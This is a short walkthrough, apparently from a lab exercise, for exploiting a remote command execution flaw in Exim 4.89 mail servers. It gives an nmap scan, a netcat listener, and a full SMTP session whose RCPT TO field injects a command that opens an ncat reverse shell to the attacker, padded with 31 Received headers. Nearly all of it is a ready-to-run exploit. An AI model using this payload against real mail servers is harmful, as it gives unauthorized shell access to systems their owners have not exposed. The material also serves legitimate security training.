Scan the server
```
# First scan the remote server

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Exim smtpd 4.89
| smtp-commands: cve-2019-10149-eximrce-red Hello ip-10-102-100-28.eu-west-1.compute.internal [10.102.100.28], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
Service Info: Host: cve-2019-10149-eximrce-red
```

Setup a Netcat listener
```
nc -nvlp 4444
```

The SMTP server is vulnerable to RCE. The attacker can remotely access the SMTP port using `netcat` and set up an email connecting to localhost.
```
# Connect to the remotehost
nc ipaddress 25

# Connecting to localhost
HELO localhost

# Can be left empty
MAIL FROM:<>

# You can run '/bin/netcat' to create a reverse shell. 
# Change the 'ip' and 'port'
RCPT TO:<${run{\x2Fbin\x2Fncat\t-e\t\x2Fbin\x2Fsh\t<IP>\t<PORT>}}@localhost>

# Attacker can send data by sending 'DATA' command, 
# followed by the 31 'Received' header lines
DATA
Received: 1
Received: 2
Received: 3
Received: 4
Received: 5
Received: 6
Received: 7
Received: 8
Received: 9
Received: 10
Received: 11
Received: 12
Received: 13
Received: 14
Received: 15
Received: 16
Received: 17
Received: 18
Received: 19
Received: 20
Received: 21
Received: 22
Received: 23
Received: 24
Received: 25
Received: 26
Received: 27
Received: 28
Received: 29
Received: 30
Received: 31
.
```

By this point, you should have caught a shell in your listener.